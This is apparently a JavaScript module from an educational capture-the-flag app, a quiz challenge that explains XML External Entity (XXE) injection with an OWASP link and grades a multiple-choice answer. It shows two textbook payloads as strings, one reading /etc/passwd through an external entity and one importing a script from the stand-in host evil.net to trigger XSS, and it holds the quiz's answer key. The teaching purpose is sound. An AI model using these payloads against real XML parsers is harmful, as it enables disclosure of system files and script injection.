// TODO: Code this up!
let CTF_8 = {
    points: 100,
    answered: false,
    answer : async () => {
        let a = null
        try {
            a = document.getElementById('ctf8-flag').querySelectorAll('input[type="radio"]:checked')[0].value
        } catch {
            a = "fail"
        }
        let flag_good = /*html*/ `
            <svg class="ctf-icon-success ctf-modal-middle" width="3em" height="3em" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" d="M3.5 1a.5.5 0 0 1 .5.5v13a.5.5 0 0 1-1 0v-13a.5.5 0 0 1 .5-.5z"/>
            <path fill-rule="evenodd" d="M3.762 2.558C4.735 1.909 5.348 1.5 6.5 1.5c.653 0 1.139.325 1.495.562l.032.022c.391.26.646.416.973.416.168 0 .356-.042.587-.126a8.89 8.89 0 0 0 .593-.25c.058-.027.117-.053.18-.08.57-.255 1.278-.544 2.14-.544a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-.5.5c-.638 0-1.18.21-1.734.457l-.159.07c-.22.1-.453.205-.678.287A2.719 2.719 0 0 1 9 9.5c-.653 0-1.139-.325-1.495-.562l-.032-.022c-.391-.26-.646-.416-.973-.416-.833 0-1.218.246-2.223.916A.5.5 0 0 1 3.5 9V3a.5.5 0 0 1 .223-.416l.04-.026z"/>
            </svg>
        `
        let flag_bad = /*html*/ `
            <svg class="ctf-icon-error ctf-modal-middle" width="3em" height="3em" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" d="M3.5 1a.5.5 0 0 1 .5.5v13a.5.5 0 0 1-1 0v-13a.5.5 0 0 1 .5-.5z"/>
            <path fill-rule="evenodd" d="M3.762 2.558C4.735 1.909 5.348 1.5 6.5 1.5c.653 0 1.139.325 1.495.562l.032.022c.391.26.646.416.973.416.168 0 .356-.042.587-.126a8.89 8.89 0 0 0 .593-.25c.058-.027.117-.053.18-.08.57-.255 1.278-.544 2.14-.544a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-.5.5c-.638 0-1.18.21-1.734.457l-.159.07c-.22.1-.453.205-.678.287A2.719 2.719 0 0 1 9 9.5c-.653 0-1.139-.325-1.495-.562l-.032-.022c-.391-.26-.646-.416-.973-.416-.833 0-1.218.246-2.223.916A.5.5 0 0 1 3.5 9V3a.5.5 0 0 1 .223-.416l.04-.026z"/>
            </svg>
        `
        let h = /*html*/ `
        <div class="ctf-block ctf-modal-middle">
        `
        let b = ``

        if(ctf.answerstatus.eight == 'true') {
            h = h+`<section>This question has already been answered correctly.</section>`
            b = `<button class="ctf-button-red" id="nav-ctf8-next"><b>Next Challenge</b></button>`
        } else {
            switch(a){
                case "html":
                    h = h+flag_bad+`Almost! <section>While HTML is involved in this attack, this answer is not quite right.</section>`
                    CTF_8.points = CTF_8.points-10;
                    break;
                case "not":
                    h = h+flag_bad+`Nope, that's not quite right`
                    CTF_8.points = CTF_8.points-25;
                    break;
                case "local":
                    h = h+flag_bad+`Nope, that's not quite right`
                    CTF_8.points = CTF_8.points-25;
                    break;
                case "remote":
                    CTF_8.answered = true;
                    if(CTF_8.points < 1) {
                        CTF_8.points = 0;
                    }
                    ctf.answerstatus.eight = 'true'
                    h = h+flag_good+`Correct! <section>This is an example of an XXE that attempts to pull a remote resource - in this case, from evil.net. 
                    It does so by including an XML "namespace", which is a way to tell the XML parser: "Hey! Here is how my data is structured." In 
                    the real world, however, the developers should not allow for arbitrary XML namespaces to be included. 
                    Further, if the attack is successful, an XSS payload could be triggered (<i>remember XSS from earlier?</i>). This is an example 
                    of a "chained attack" where XXE allowed us to then trigger an XSS vulnerability.  
                    </section><section class="ctf-html-inner-text-center">Points Earned: `+String(CTF_8.points)+`</section>`
                    // nav outta here
                    b = `<button class="ctf-button-red" id="nav-ctf8-next"><b>Next Challenge</b></button>`
                    // this is a flag
                    let f = new ctf.flag(CTF_8.points,8,9)
                    ctf.capture(f);
                    break;
                default:
                    h = h+flag_bad+`Nope, that's not quite right`
            }
        }
        h=h+`</div>`
        ctf.modal.set("Results",h,b);
    },
    render : async () => {
        // TODO: Need to fix the UI mobile view. Text in mobile view is paginated weirdly
        // TODO: make HTML code by line numbers! Then, make selection what line is vuln at!
        let code_raw = `<HTML xmlns:xss>
<?import namespace="xss" implementation="http://evil.net/xss.js">
<xss:xss>XSS</xss:xss>
</HTML>`
        let code_raw2 = `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`
        let code_formated = ctf.toCodeBlock(code_raw)
        let code_formated2 = ctf.toCodeBlock(code_raw2)
        let view =  /*html*/`
        <section class="section-lite">
        <h2>XML External Entity Injection (XXE)</h2><img src="data:image/png;base64,`+ctf.flagImg+`" width="100">
        </section>
        <div><section>
        An <b>XML External Entity Injection</b>, or "XXE" for short, is a type of injection attack that targets <i>XML Parsers</i> in the web application. Read about   
        <a target="_blank" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)">XXE on OWASP</a>. 
        XML is short for eXtensible Markup Language, which is used by developers as way to give <i>structure</i> to data, typically text. Easily the most popular application 
        of XML is what you're looking at right now - HTML (HyperText Markup Language), which is just an application of XML. In the case of the web (HTML), this structure 
        tells your web browser what certain elements of the page are and how to display them.  
        </section>&nbsp;<section>
        Web applications that live on the server also typically "read" XML sent by the client. This XML can sometimes be modified in a particular way that would "fool" 
        the web application into doing something that the developers did not intend. An example XXE might look like:
        </section><section>
        `+code_formated2+`
        </section>&nbsp;<section>
        If vulnerable, the above XML would trick the application into including an "external" resource, in this case, the file: <b>/etc/passwd</b>, 
        a sensitive "password" file used on UNIX and Linux systems that would be read and included in the repsonse back to the attacker. 
        </section>
        <section>&nbsp;</section>
        </div>
        Below is an <i>over-simplified</i> example of an XXE attack:
        <div class="ctf-html-outter">
        </div>`+code_formated+`
        </div>
        <section>&nbsp;</section><section><h3><u>If successful, what would this XXE attack actually do?</u></h3></section>
        <div class="ctf-html-outter">
        <div class="ctf-html-inner-left">
        
        <form id="ctf8-flag">
        <div class="ctf-code-left">
        <span class="ctf-block"><input type="radio" name="answer" value="local"><label for="submit">&nbsp;Include the local file "xss.js" and trigger an XSS</label></span>
        <span class="ctf-block"><input type="radio" name="answer" value="remote"><label for="submit">&nbsp;Pull the remote file "xss.js" and trigger an XSS</label></span>
        <span class="ctf-block"><input type="radio" name="answer" value="html"><label for="submit">&nbsp;Trick the parser into respoding with HTML instead of XML</label></span>
        <span class="ctf-block"><input type="radio" name="answer" value="not"><label for="submit">&nbsp;This is not actually a valid XXE attack</label></span>
        
        <section>&nbsp;</section>
        <div class="ctf-html-inner-text-center"><span class="ctf-block"><input type="submit" id="ctf8_flag_submit" name="ctf8_flag_submit" data-micromodal-trigger="modal" class="ctf-button-red" value="Answer"></span></div>
        </form>
        </div></div>
        `
        return view
    },
    after_render: async (cb) => {
        document.getElementById('ctf8-flag').onsubmit = function(e){e.preventDefault(); return false;}
        document.getElementById('ctf8-flag').addEventListener('submit', function(){
            CTF_8.answer()
            .then(function(){
                if(CTF_8.answered) {
                    document.getElementById('nav-ctf8-next').addEventListener('click', function(){
                        ctf.modal.hideAll();
                        cb({action:"nav",to:"ctf/9"},null);
                    })
                }
            })
        });
    }
        
}

export default CTF_8;